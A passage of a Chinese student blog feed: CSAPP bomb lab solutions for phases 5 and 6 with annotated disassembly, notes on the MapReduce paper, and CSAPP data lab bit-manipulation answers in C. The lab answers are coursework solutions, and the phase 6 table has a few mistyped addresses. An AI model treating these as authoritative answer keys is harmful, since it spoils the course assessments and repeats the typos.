phase_5这里一开始看到字符串比较，我就以为是之前的套路，查找正确字符串地址，发现是flyers，输入flyers，结果却是boom！！！爆炸了。 仔细查看代码，发现并不是直接拿输入的字符串和”flyers”比较，而是对输入字符串低4位做一定操作后得到的结果和flyers比较。 那么是什么操作呢？注意到程序中截取输入字符串中每个字母的低四位进行操作，结合movzbl 0x4024b0(%rdx), %edx，看一看0x4024b0处，发现是一堆字母。 并且最后进行字符串比较的，是flyers和从0x4024b0偏移得到的字符串。 明白了，0x4024b0就是一个含有flyers的表格，输入字符串低四位就是flyers在表格中的索引位置。 所以只要数一下flyers在表格里是第几位，就可以分别得到输入字符串的低四位。 又因为输入是字符串，所以查一下ascii表就行。最后的结果是ionefg。（不唯一，用大写字母应该也是可以的，只要低四位符合要求就行）。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980810000000000401062 &lt;phase_5&gt;: 401062: 53 push %rbx 401063: 48 83 ec 20 sub $0x20,%rsp 401067: 48 89 fb mov %rdi,%rbx #rbx存放输入的字符串首地址 40106a: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401071: 00 00 401073: 48 89 44 24 18 mov %rax,0x18(%rsp) 401078: 31 c0 xor %eax,%eax 40107a: e8 9c 02 00 00 callq 40131b &lt;string_length&gt; 40107f: 83 f8 06 cmp $0x6,%eax #输入字符串长度为6 401082: 74 4e je 4010d2 &lt;phase_5+0x70&gt; 401084: e8 b1 03 00 00 callq 40143a &lt;explode_bomb&gt; 401089: eb 47 jmp 4010d2 &lt;phase_5+0x70&gt; 40108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx #读取一个字符串，取其低四位，在0x4024b0处查表。具体的查表内容是flyers，我们需要指向flyers六个字母的索引。 40108f: 88 0c 24 mov %cl,(%rsp) #所以输入的字符串，低四位就是flyers在表处的索引。 401092: 48 8b 14 24 mov (%rsp),%rdx 401096: 83 e2 0f and $0xf,%edx 401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx #print (char *) 0x4024b0看到一连串字母 4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4: 48 83 c0 01 add $0x1,%rax 4010a8: 48 83 f8 06 cmp $0x6,%rax 4010ac: 75 dd jne 40108b &lt;phase_5+0x29&gt; 4010ae: c6 44 24 16 00 movb $0x0,0x16(%rsp) 4010b3: be 5e 24 40 00 mov $0x40245e,%esi #此处的字符串是flyers 4010b8: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 4010bd: e8 76 02 00 00 callq 401338 &lt;strings_not_equal&gt; 4010c2: 85 c0 test %eax,%eax 4010c4: 74 13 je 4010d9 &lt;phase_5+0x77&gt; 4010c6: e8 6f 03 00 00 callq 40143a &lt;explode_bomb&gt; 4010cb: 0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0: eb 07 jmp 4010d9 &lt;phase_5+0x77&gt; 4010d2: b8 00 00 00 00 mov $0x0,%eax 4010d7: eb b2 jmp 40108b &lt;phase_5+0x29&gt; 4010d9: 48 8b 44 24 18 mov 0x18(%rsp),%rax 4010de: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 4010e5: 00 00 4010e7: 74 05 je 4010ee &lt;phase_5+0x8c&gt; 4010e9: e8 42 fa ff ff callq 400b30 &lt;__stack_chk_fail@plt&gt; 4010ee: 48 83 c4 20 add $0x20,%rsp 4010f2: 5b pop %rbx 4010f3: c3 retq phase_6第六个炸弹是最难的，变量赋值运算繁多，地址映射关系复杂，理不断剪还乱，需要将程序划分为几个模块来理解。 读数第一个阶段是读取六个数字，然后进入两个循环，第一个循环检查读入的数字是否大于0，小于等于6，第二个循环将前面的数字与后面的每个数字进行比较，保证相互之间不相等。 综上输入的六个数字必须是1~6并且互不相等，所以必然是1，2，3，4，5，6六个数字，输入顺序需要我们进一步确定。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787900000000004010f4 &lt;phase_6&gt;: 4010f4: 41 56 push %r14 4010f6: 41 55 push %r13 4010f8: 41 54 push %r12 4010fa: 55 push %rbp 4010fb: 53 push %rbx 4010fc: 48 83 ec 50 sub $0x50,%rsp 401100: 49 89 e5 mov %rsp,%r13 401103: 48 89 e6 mov %rsp,%rsi 401106: e8 51 03 00 00 callq 40145c &lt;read_six_numbers&gt; 40110b: 49 89 e6 mov %rsp,%r14 40110e: 41 bc 00 00 00 00 mov $0x0,%r12d #=========================================================================================== #section1 #目的：读取6个数，这六个数互不相同且都小于等于6。 #大循环执行六次，保证每个数字小于6,小循环执行6-i次，保证两两不相同。 #读入数字放在rsp~(rsp+20)里 #=========================================================================================== 401114: 4c 89 ed mov %r13,%rbp #r13 #rbp指向当前需要判断的数字 401117: 41 8b 45 00 mov 0x0(%r13),%eax #eax=r13所指向的数字 40111b: 83 e8 01 sub $0x1,%eax #eax&lt;=6，即数字必须小于等于6 40111e: 83 f8 05 cmp $0x5,%eax #无符号比较，所以如果输入数字为0,则0-1溢出变成无穷大，又因为输入数字小于等于6,所以输入数字必定是1 2 3 4 5 6,只是顺序不确定 401121: 76 05 jbe 401128 &lt;phase_6+0x34&gt; 401123: e8 12 03 00 00 callq 40143a &lt;explode_bomb&gt; 401128: 41 83 c4 01 add $0x1,%r12d #r12d 控制下面程序的执行次数 40112c: 41 83 fc 06 cmp $0x6,%r12d 401130: 74 21 je 401153 &lt;phase_6+0x5f&gt; #执行6-r12d次 401132: 44 89 e3 mov %r12d,%ebx #ebx是控制小循环的计数器 401135: 48 63 c3 movslq %ebx,%rax 401138: 8b 04 84 mov (%rsp,%rax,4),%eax 40113b: 39 45 00 cmp %eax,0x0(%rbp) #rbp外面大循环的数字，eax里面小循环的数字，两者必须不同 40113e: 75 05 jne 401145 &lt;phase_6+0x51&gt; 401140: e8 f5 02 00 00 callq 40143a &lt;explode_bomb&gt; 401145: 83 c3 01 add $0x1,%ebx 401148: 83 fb 05 cmp $0x5,%ebx 40114b: 7e e8 jle 401135 &lt;phase_6+0x41&gt; #循环判别条件 40114d: 49 83 c5 04 add $0x4,%r13 #r13+4,相当于指向下一个数字 401151: eb c1 jmp 401114 &lt;phase_6+0x20&gt; 变数用7减去输入的数字，并按照原来的顺序保存差的结果，进入下一个阶段。 1234567891011121314151617181920212223242526272829section2#对读入的每一个数字num有,num=7-num#=========================================================================================== 401153: 48 8d 74 24 18 lea 0x18(%rsp),%rsi #rsi=rsp+24=0 401158: 4c 89 f0 mov %r14,%rax #r14一开始指向rsp = 读入的第一个数字 40115b: b9 07 00 00 00 mov $0x7,%ecx 401160: 89 ca mov %ecx,%edx 401162: 2b 10 sub (%rax),%edx #edx=7, (%rax)=第一个数字 401164: 89 10 mov %edx,(%rax) #第一个数字n变成 7-n 401166: 48 83 c0 04 add $0x4,%rax #rax指向下一个数字 40116a: 48 39 f0 cmp %rsi,%rax #rsi=rsp+24 40116d: 75 f1 jne 401160 &lt;phase_6+0x6c&gt; 40116f: be 00 00 00 00 mov $0x0,%esi 401174: eb 21 jmp 401197 &lt;phase_6+0xa3&gt;#=========================================================================================== 获取地址每一个数字都对应一个地址，这个阶段是将数字对应的地址，按照数字输入的顺序存放到rsp+32中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 #=========================================================================================== #section3 #ecx依次遍历6个数字，然后将每个数字对应的地址存放在rsp+32中 #=========================================================================================== #获取数字所对应的地址 #数字对应的地址是固定的，但是地址存放的顺序是不确定的，由输入数字的顺序确定地址存放的顺序。 401176: 48 8b 52 08 mov 0x8(%rdx),%rdx 40117a: 83 c0 01 add $0x1,%eax 40117d: 39 c8 cmp %ecx,%eax #ecx指向输入的数字,一开始eax=2 40117f: 75 f5 jne 401176 &lt;phase_6+0x82&gt; #若eax不等于ecx，则一直增大eax直到相等为止，同时改变rdx的值 401181: eb 05 jmp 401188 &lt;phase_6+0x94&gt; 401183: ba d0 32 60 00 mov $0x6032d0,%edx #获取数字1对应的地址 #存放地址 401188: 48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) 40118d: 48 83 c6 04 add $0x4,%rsi #将rdx依次放入rsp+32中，一个地址8个字节。 401191: 48 83 fe 18 cmp $0x18,%rsi #一共放6次 401195: 74 14 je 4011ab &lt;phase_6+0xb7&gt; #-&gt;section2直接跳转到这里 401197: 8b 0c 34 mov (%rsp,%rsi,1),%ecx #rsp还是指向第一个数字，一开始rsi=0，ecx依次遍历六个数字 40119a: 83 f9 01 cmp $0x1,%ecx 40119d: 7e e4 jle 401183 &lt;phase_6+0x8f&gt; #因为数字都小于等于6且互不相同，所以7-输入数字后，应该只有一个数字是小于等于1的。因为后面要求数字大于等于2,所以先把等于1的数字安排了。 40119f: b8 01 00 00 00 mov $0x1,%eax 4011a4: ba d0 32 60 00 mov $0x6032d0,%edx 4011a9: eb cb jmp 401176 &lt;phase_6+0x82&gt;#=========================================================================================== 变址上一阶段存放到rsp+32中的地址只是内存地址，类似于指针，其本身还指向一个数值。 这里要求将后一个地址存放到前一个地址的后面。 123456789101112131415161718192021222324252627282930313233#=========================================================================================== #section4#将后一个地址放在前一个地址+8处，方便后面比较4011ab: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx #rbx=(rsp+32)=section3 第一个存入的地址4011b0: 48 8d 44 24 28 lea 0x28(%rsp),%rax #rax指向第二个存入的地址4011b5: 48 8d 74 24 50 lea 0x50(%rsp),%rsi #rsi用于判断遍历结束4011ba: 48 89 d9 mov %rbx,%rcx #rcx遍历存入rsp中的地址4011bd: 48 8b 10 mov (%rax),%rdx #rdx是第二个存入的地址4011c0: 48 89 51 08 mov %rdx,0x8(%rcx)4011c4: 48 83 c0 08 add $0x8,%rax4011c8: 48 39 f0 cmp %rsi,%rax4011cb: 74 05 je 4011d2 &lt;phase_6+0xde&gt;4011cd: 48 89 d1 mov %rdx,%rcx4011d0: eb eb jmp 4011bd &lt;phase_6+0xc9&gt;#=========================================================================================== 验证这里要求前一个地址对应的值要大于后一个地址对应的值。 所以现在的任务就是找到输入数字、地址、地址值之间的关系。如下表所示： 原始输入数字 7-数字 地址 地址对应值 1 6 0x603320 0x1bb 2 5 0x603310 0x1dd 3 4 0x603300 0x2b3 4 3 0x6032f0 0x39c 5 2 0x60032e0 0xa8 6 1 0x60032d0 14c 从表格以及要求我们可以知道，第一个输入数字对应的地址对应的值最大，最后一个输入数字对应的地址对应的值最小。 不难得到正确的输入序列：4，3，2，1，6，5 123456789101112131415161718192021222324252627282930313233343536373839404142434445#=========================================================================================== #section5#要求前一个地址对应的值要大于后一个地址对应的值。4011d2: 48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx)4011d9: 00 4011da: bd 05 00 00 00 mov $0x5,%ebp #以下程序执行5次，目的(rbx)&gt;=(rbx+8)，且(rbx+8)&gt;=(rbx+16)如此类推4011df: 48 8b 43 08 mov 0x8(%rbx),%rax #rax是第二个地址4011e3: 8b 00 mov (%rax),%eax #eax是第二个地址对应的内存中存放的数值4011e5: 39 03 cmp %eax,(%rbx) #rbx是第一个地址，(rbx)是第一个地址对应的内存中存放的数值4011e7: 7d 05 jge 4011ee &lt;phase_6+0xfa&gt;4011e9: e8 4c 02 00 00 callq 40143a &lt;explode_bomb&gt;4011ee: 48 8b 5b 08 mov 0x8(%rbx),%rbx4011f2: 83 ed 01 sub $0x1,%ebp 4011f5: 75 e8 jne 4011df &lt;phase_6+0xeb&gt;4011f7: 48 83 c4 50 add $0x50,%rsp#=========================================================================================== 4011fb: 5b pop %rbx4011fc: 5d pop %rbp4011fd: 41 5c pop %r124011ff: 41 5d pop %r13401201: 41 5e pop %r14401203: c3 retq 总结通过这次试验，大致了解了gdb的使用，虽然我觉得以后不太可能从事汇编相关的工作（看的脑疼），不过还是收获蛮多的。]]></content>
      <categories>
        <category>c语言</category>
      </categories>
      <tags>
        <tag>c语言</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MapReduce]]></title>
    <url>%2F2019%2F03%2F10%2FMapReduce%2F</url>
    <content type="text"><![CDATA[MapReduce MapReduce是谷歌在2004年发布的一项新技术，该技术旨在解决大数据规模下的日常问题。MapReduce有两部分组成：Map负责将输入的键/值对转换成适合处理的键/值对，而reduce则负责将map产生的键/值对按照要求合并起来。MapReduce隐藏了分布式底层的细节，比如容错性、局部最优化、负载均衡等，使得一个对并行计算一窍不通的人都能很好的利用分布式系统的优势来解决自己的问题。换句话说，MapReduce将分布式计算设置成一个接口，用户可以假设这个接口能提高强大的、正确的、有效的分布式计算能力，用户本身只需要提供自己想要完成的任务即可。MapReduce是数据增长到一定规模的必然产物，类似操作系统一样，对底层分布式的相关细节做一个抽象，将控制和实现分开，大大提升了生产力。 MapReduce解决了什么问题？当数据规模持续增大时，一些简单的问题就变得十分复杂。比如统计不同字母出现的频次，如果对象是一篇文章，单机就能很好的完成任务；如果对象是今日头条所有的新闻，那用单机来处理的速度和所花费的时间将会令人感到绝望，而MapReduce就是为了解决大规模数据下的常规问题而提出的一种算法。 MapReduce的目的MapReduce旨在充分利用分布式集群的计算能力，统筹成千上万台服务器并提供强大的计算能力，目标在极短的时间内在几十TB的数据上完成预定操作；并且提供一个易于调用的接口，隐藏内部复杂的实现细节，使得一个对分布式系统一窍不通的人都能利用分布式计算的强大计算力。 MapReduce的基本原理：MapReduce程序将数据划分到M个计算节点中做映射操作，产生的中间结果存放到该计算节点的本地磁盘里，并将这些中间结果通过划分函数划分为R份，R份对应于R台执行reduce操作的计算节点。当map的计算节点完成任务时，将会通过master通知reduce节点，然后reduce节点会从map节点取走相应的数据，处理完后输出到指定的输出文件。一些典型的划分函数时hash(key)mod R,这么做的好处是，不同map计算节点上产生的相同key值的数据将会被映射到同一台reduce计算节点上处理。具体流程如下： 在用户程序中MapReduce库首先会将输入文件划分为相同大小的数据片（数据片的大小可由用户指定，一般为16-64MB),然后将程序复制到集群中的所有计算节点中去。 其中一个节点是master节点，其他节点将会被划分为M个执行map操作的计算节点，和R个执行reduce操作的计算节点，master节点操作空闲的节点并分派map或者reduce任务。 map节点对输入数据执行用户定义好的map操作，将产生的中间结果存放在内存。 map节点的中间结果将会周期性的存到本次磁盘，在存放时会调用划分函数，将中间结果划分到R个不同区域中。随后，存放这些中间结果的本地磁盘的地址将会被发送到master节点，master节点负责联系相应的reduce节点接收数据。 当reduce节点收到master节点的通知后，将会通过远程连接取走map节点上的数据，当reduce节点取完数据后，会对取来的数据进行一次排序，使得key值相同的数据连在一起，便于处理，这么做是因为会有很多个不同key值对应的数据映射到同一个reduce节点上。（划分函数是hash(key)mod R,显然一些key值的数据哈希值相同） reduce节点利用用户定义的reduce函数处理接受到的数据，并将结果放到指定输出文件里。一个reduce节点对应GFS上的一个输出文件。 当所有的map和reduce操作完成时，master节点会通知用户程序，至此完成一次mapreduce操作。 当mapreduce操作完成时，最后的结果将会存放到R个指定输出文件里，用户可以根据需求合并这R个文件的结果，或者将这R个文件作为下一个mapreduce操作的输入。 一般而言，map节点的数量应该非常大，而reduce节点的数量则相对少很多。 master节点的作用master节点会记录所有map节点和reduce节点的状态（idle, in-progress or completed)，同时也会记录已经被分配了任务的机器节点方便调配。master节点可以看成是map节点和reduce节点的管道，map节点利用master节点来通知相应的reduce节点来取走相应的数据。 fault tolerance 节点失联：如果map节点挂了，那么master节点重新分配这台map节点分配到的map任务。如果reduce节点挂了，那么重新安排一台新的机器来reduce，不需要重新执行这台机器的reduce任务。因为map节点的中间结果是存放到本地的，这意味着map节点挂了，它的任务的执行结果也就拿不到了。但是reduce节点是将结果存放到指定输出文件的，所以reduce节点挂了，它的处理结果还在，因此不需要重新启动reduce任务。 master失联：一般master不会失联，如果失联了，就返回一个执行失败的提示给用户程序，让用户重新启动一个新的任务。 对于有两个map节点领取到同一个map任务的情况：因为是由master节点负责协调map节点和reduce节点，所以只有其中一台map节点的数据是可用的。 对于有两个reduce节点领取到同一个任务的情况：reduce节点的输出是直接写到GFS上的，而GFS上的文件命名是跟key值相关且唯一的，所以如果有两台reduce节点领取到同一个任务，那么处理的key值就会相同，而由于GFS文件命名的唯一性，最终只有一个reduce节点的结果会写入到GFS上。 backup tasks谷歌的大佬发现，有的机器运行久了，或者是其他任务占用同一台机器，使得一个mapreduce任务执行到后期时，运行速度会变慢。所以他们提出了一个办法解决这个问题，就是当mapreduce任务执行到后期时，master会备份还处于执行状态的所有任务，这时候只要原来的执行程序和备份的执行程序任意一个完成执行任务，就宣布本次mapreduce任务完成。谷歌大佬表示，这么做还挺有效的。 提升MapReduce执行速度的小窍门 partitioning function：常规的划分函数是hash(key)mod R,这样可以使不同map节点相同的key值映射到同一个reduce节点。如果任务有特殊要求，可以改变这个划分函数，使得我们想要reduce的数据划分在同一个reduce节点里。 combiner function:谷歌大佬发现，网络带宽是个很稀少的资源，所以数据能少传就少传。因此对于一些特殊的任务，可以在map节点结算出中间结果后，现在map节点来reduce一次，再将reduce的结果发给reduce节点。比如统计字母频次的任务，map的结果是(“word”,1)，如果直接发送中间结果，那意味着会发送几百万条(“word”,1)，非常占用带宽，但是如果在map节点就来一次reduce，那么发送给reduce节点的数据就仅仅是一条(“word”,100000)，带宽明显节省了很多。 ordering guarantees：保证中间的处理结果是升序的。 Input and output types:定义一个好的输入输出类型噢。 side-effects:在map/reduce操作中输出一些用户想要的数据保存到临时文件里。 skipping bad records:用户提供的程序或者是其他什么东西可能会有错，进而阻塞mapreducue的完成，因此可以选择跳过某些完成不了的片段，继续去执行之后的片段。 local execution:在本地运行分布式程序，方便debug。 status information:生成一个页面，页面里有map节点数量、reduce节点数量、已完成的任务数量等等信息，方便用户监测任务完成状态以及查错。 counters:统计完成了的map/reduce任务数量。]]></content>
      <categories>
        <category>分布式</category>
        <category>MIT</category>
      </categories>
      <tags>
        <tag>分布式</tag>
        <tag>MIT6.824</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSAPP-lab1-DATALAB]]></title>
    <url>%2F2019%2F03%2F07%2FCSAPP-lab1%2F</url>
    <content type="text"><![CDATA[本次实验主要是考察书本第二章的内容，要求掌握数字信息在计算机中的存储方式以及相关运算，比如数字的补码表示，补码运算；浮点数的表示和计算等，需要了解计算机是如何去“认识”一个数字。事实上题目本身不难，但是可用的运算操作符和最大的操作符数量有限制，这就使得题目难度陡升，需要仔细思考，纠结很久才能写完一题，这是因为本人对位运算不怎么熟悉。下面具体分析一下每一道题。(ps:这里有一个解释写的比较好的网站，位运算有时候就是想不出来，郁闷。) bitXor这里要求使用~和&amp;来实现异或。异或的关键是相同为0,不同为1,思路是发掘(0,0)和(1,1)，(1,0)和(0,1)两个组合各自共同点，以及两个组合之间的不同点。对于(0,0)和(1,1)，(x&amp;~y)和(~x&amp;y)的结果必定都等于0,而(0,1)和(1,0)的结果一个为0一个为1,当结果取反相与时，(0,0)和(1,1)的组合得到的结果是1,(0,1)和(1,0)组合得到的结果是0,这时候就能将两者区分开来了。 12345678910111213141516/* * bitXor - x^y using only ~ and &amp; * Example: bitXor(4, 5) = 1 * Legal ops: ~ &amp; * Max ops: 14 * Rating: 1 */int bitXor(int x, int y) &#123;//for (0,0),(1,1),tmp1 and tmp2 are all 0, while one of (1,0) and (0,1) is 1.//so for (0,0),(1,1) ~tmp1 and ~tmp2 are all 1, and one of (1,0) and (0,1) is 0 int tmp1 = (~x &amp; y); int tmp2 = (x &amp; ~y); int tmp3 = (~ tmp1) &amp; (~ tmp2); int tmp4 = ~ tmp3; return tmp4;&#125; tmin这个是求补码的最小值，移位即可。 123456789/* * tmin - return minimum two's complement integer * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 4 * Rating: 1 */int tmin(void) &#123;//补码的最小值 return 0x1&lt;&lt;31; isTmax以0111为例，观察到Tmax+1=1000,此时刚好每一位都与原来相反，所以异或结果为全1,取反结果为0,！后结果为1。除了max外，-1也有这样的效果，所以需要把-1的情况排除。1234567891011/* * isTmax - returns 1 if x is the maximum, two's complement number, * and 0 otherwise * Legal ops: ! ~ &amp; ^ | + * Max ops: 10 * Rating: 1 */int isTmax(int x) &#123; int tmp = !(~x);//if x=-1 then tmp=1 else 0 return !(~((x + 1) ^ x) | tmp);&#125; allOddBits判断是不是所有奇数位上的数值全是1。弄一个mask比较就行。这里有个技巧就是使用可以使用的最大整数（题目要求使用的整数为0～255）移位快速生成mask，而不是一位一位的移位穷举。 123456789101112131415/* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * where bits are numbered from 0 (least significant) to 31 (most significant) * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 2 */int allOddBits(int x) &#123;/* int mask = (0xaa | (0xaa&lt;&lt;8) | (0xaa&lt;&lt;16) | (0xaa&lt;&lt;24));*///mask &amp;&amp;aaaaaaaa int mask = (0xaa &lt;&lt; 8) + 0xaa; mask = (mask &lt;&lt; 16) + mask; return !((x &amp; mask) ^ mask);&#125; negate直接取反加一就好。 12345678910/* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 5 * Rating: 2 */int negate(int x) &#123; return ~x + 1;&#125; isAsciiDigit判断x是否是0-9之间的Ascii码。 判断5-8位是不是0x3 判断第四位是不是0,对应0-7的情况 判断是不是8和91234567891011121314151617/* * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9') * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 15 * Rating: 3 */int isAsciiDigit(int x) &#123; int high = !((x&gt;&gt;4) ^ 0x3); int tmp1 = !((x&amp;0x8) ^ 0); int xtmp = x&amp;0xf; int tmp2 = !(xtmp ^ 0x8); int tmp3 = !(xtmp ^ 0x9); return high &amp; (tmp1 | tmp2 | tmp3);&#125; conditional实现x?y:z。 判断x是否成立，即x是否不为0 若不为0,则生成全1的mask，若为0,则生成全0的mask 得到结果 12345678910111213141516/* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 16 * Rating: 3 */int conditional(int x, int y, int z) &#123; int mask = !!x; mask = (mask&lt;&lt;1) + mask; mask = (mask&lt;&lt;2) + mask; mask = (mask&lt;&lt;4) + mask; mask = (mask&lt;&lt;8) + mask; mask = (mask&lt;&lt;16) + mask; return (mask&amp;y) | ((~mask)&amp;z);&#125; isLessOrEqual判断s是否小于y，有三种情况： x&lt;0, y&gt;0 x,y同号且x-y&lt;0 x==y第一、二种情况可以通过判断结果的最高位来判断。1234567891011121314151617/* * isLessOrEqual - if x &lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 24 * Rating: 3 */int isLessOrEqual(int x, int y) &#123; //1)x&lt;0, y&gt;0 //2)x and y have same signed, and x - y is negative //3)x == y int res = x + (~y + 1); int flag1 = x &amp; (~y);//x&lt;0 y &gt;0 int t = x ^ y; int flag2 = (~t) &amp; res; return (((flag1 | flag2)&gt;&gt;31) &amp; 1) | (!t); &#125; logicalNeg实现！的功能。思路是判断x是不是0,观察到只有0和Tmin是减0大于0,减1小于0,所以用x分别减去0和1,通过异或最高位来判断是否是0,同时去掉tmin的特殊情况即可。12345678910111213141516/* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 4 */int logicalNeg(int x) &#123;//0-1小于0最高位为1,0最高位为0。//特殊情况是Tmin。 int res1 = x + (~1 + 1); int flag1 = ((res1 ^ x)&gt;&gt;31) &amp; 1; int flag2 = (x&gt;&gt;31)&amp;1; return (flag2^1) &amp; flag1;&#125; howManyBits判断最少需要多少位二进制来表示x。使用二分法快速查找。比如如果x&gt;8,那么至少需要3位来表示x，所以这时候可以将x右移3位，继续判断剩下还有多少个1。对正数而言，这题等价于求最高位1出现的位置，这等价于求负数的最高位0出现的位置，所以可以预处理一下。12345678910111213141516171819202122232425262728293031/* howManyBits - return the minimum number of bits required to represent x in * two's complement * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 90 * Rating: 4 */int howManyBits(int x) &#123; //binary search //find the most significant bit of 1 for positive number is equal to find the most significant bit of 0 for negtive number int sign, bit16, bit8, bit4, bit2, bit1, bit0; sign = x&gt;&gt;31; x = (~x &amp; sign) | (~sign &amp; x); bit16 = !!(x&gt;&gt;16) &lt;&lt; 4; x = x &gt;&gt; bit16; bit8 = !!(x&gt;&gt;8) &lt;&lt;3; x = x &gt;&gt; bit8; bit4 = !!(x&gt;&gt;4) &lt;&lt; 2; x = x &gt;&gt; bit4; bit2 = !!(x&gt;&gt;2) &lt;&lt; 1; x = x &gt;&gt; bit2; bit1 = !!(x&gt;&gt;1); x = x &gt;&gt; bit1; bit0 = x; return bit16 + bit8 + bit4 + bit2 + bit1 + bit0 + 1;&#125; floatScale2浮点型数字运算的关键是掌握其编码格式，只要掌握了编码格式，剩下的就好办了。123456789101112131415161718192021//float/* * floatScale2 - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */unsigned floatScale2(unsigned uf) &#123; if(uf == 0 || uf == (1 &lt;&lt; 31)) return uf; if(((uf &gt;&gt; 23) &amp; 0xff) == 0xff) return uf; if(((uf &gt;&gt; 23) &amp; 0xff) == 0x00) return ((uf &amp; 0x007FFFFF) &lt;&lt; 1) | ((1 &lt;&lt; 31) &amp; uf); return uf + (1 &lt;&lt; 23);&#125; floatFloat2Int1234567891011121314151617181920212223242526272829303132333435/* * floatFloat2Int - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */int floatFloat2Int(unsigned uf) &#123; int sign = (uf &gt;&gt; 31) &amp; 0x1; int e = (uf &gt;&gt; 23) &amp; 0xFF; int frac = uf &amp; 0x7FFFFF; int exponent = e - 127; int newFrac = 0x1000000 + frac; int shifted; if(exponent &lt; 0 || e == 0) return 0; if(exponent &gt;= 31 || e == 0xFF) return 0x80000000; if(exponent &gt; 24) shifted = newFrac &lt;&lt; (exponent - 24); else shifted = newFrac &gt;&gt; (24 - exponent); if(sign) shifted = -shifted; return shifted;&#125; floatPower2123456789101112131415161718192021222324252627/* * floatPower2 - Return bit-level equivalent of the expression 2.0^x * (2.0 raised to the power x) for any 32-bit integer x. * * The unsigned value that is returned should have the identical bit * representation as the single-precision floating-point number 2.0^x. * If the result is too small to be represented as a denorm, return * 0. If too large, return +INF. * * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while * Max ops: 30 * Rating: 4 */unsigned floatPower2(int x) &#123; if(x &lt; -150) return 0; if(x &lt;= -127)&#123; int shiftAmount = -x - 127; int frac = 1 &lt;&lt; shiftAmount; return frac; &#125; if(x &lt;= 127)&#123; int e = (x + 127) &lt;&lt;23; return e; &#125; return 0xFF &lt;&lt; 23;&#125; 踩坑&amp;总结 补码加减法：直接用两个数字的补码进行加减，然后只保留最低的w位就行了（w是32或者64，也即是位的数量）。 8|0不是1，8||0才是1，或者说1&amp;8等于0，相当于是0001&amp;1000，结果当然是0啦！！ 注意&amp; | 和 &amp;&amp; ||的区别，一个是对每一位的运算，一个是逻辑运算，比如1&amp;8=0,1&amp;&amp;8=1，别弄混了！]]></content>
      <categories>
        <category>c语言</category>
      </categories>
      <tags>
        <tag>c语言</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[现代操作系统第五章——输入输出]]></title>
    <url>%2F2019%2F03%2F06%2FMOS-chapter5%2F</url>
